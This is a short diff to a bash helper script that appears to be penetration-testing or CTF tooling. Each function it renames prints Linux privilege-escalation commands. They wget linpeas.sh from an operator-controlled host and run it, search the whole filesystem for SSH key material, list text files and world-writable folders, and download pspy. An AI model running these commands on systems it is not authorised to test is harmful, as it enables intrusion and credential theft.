@@ -44,31 +44,31 @@ download_linpeas() {
     echo "wget http://$http_ip:$http_port/linpeas.sh -O linpeas.sh"
 }
 
-run_linpeas() {
+get_run_linpeas_commands() {
     download_linpeas
     echo 'chmod +x linpeas.sh'
     echo './linpeas.sh'
 }
 
-get_unix_privesc_check() {
+download_unix_privesc_check() {
     cp /usr/share/unix-privesc-check/unix-privesc-check .
     generate_linux_download unix-privesc-check
 }
 
-check_ssh_keys() {
+get_ssh_keys_commands() {
     echo 'find / -regex ".*\.ssh.*" 2>/dev/null'
 }
 
-check_text_files() {
+get_check_text_files_commands() {
     echo 'find / -type f -name "*.txt" 2>/dev/null'
 }
 
-find_folders_with_write_permissions() {
+get_find_folders_with_write_permissions_commands() {
     echo 'find . -type d -perm -002 -print 2>/dev/null'
 }
 
 
-get_pspy() {
+download_pspy() {
     local url='https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64'
     if [[ -f "pspy64" ]]; then
         echo "pspy64 already exists, skipping download."
